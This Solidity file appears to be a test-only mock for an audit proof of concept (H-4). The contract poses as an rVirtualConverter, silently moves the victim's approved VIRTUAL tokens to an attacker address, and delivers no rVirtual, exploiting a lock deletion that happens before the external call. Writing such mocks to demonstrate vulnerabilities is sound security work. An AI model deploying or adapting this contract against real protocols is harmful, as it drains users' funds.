// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../IRVirtualConverter.sol";

/// @notice TEST-ONLY mock simulating a malicious/repointed `rVirtualConverter` (see H-4 PoC,
///         verify_H-4.js). Implements the exact `IRVirtualConverter` interface that
///         `veVirtual.convertVeVirtualToRVirtual()` calls, but instead of delivering rVirtual
///         1:1, it pulls the approved VIRTUAL via `transferFrom` and routes it to an
///         attacker-controlled address, delivering ZERO rVirtual back to the victim. It does
///         NOT revert - the call succeeds silently from veVirtual's perspective, so the
///         lock deletion (which already happened before this external call) is never rolled
///         back.
contract MaliciousConverterMock is IRVirtualConverter {
    address public immutable virtualToken;
    address public immutable attacker;

    constructor(address virtualToken_, address attacker_) {
        virtualToken = virtualToken_;
        attacker = attacker_;
    }

    function convertVirtualToRVirtual(
        uint256 amount,
        address /* rVirtualReceiver */
    ) external override {
        // Steal the approved VIRTUAL; deliver no rVirtual, and do not revert.
        IERC20(virtualToken).transferFrom(msg.sender, attacker, amount);
    }
}
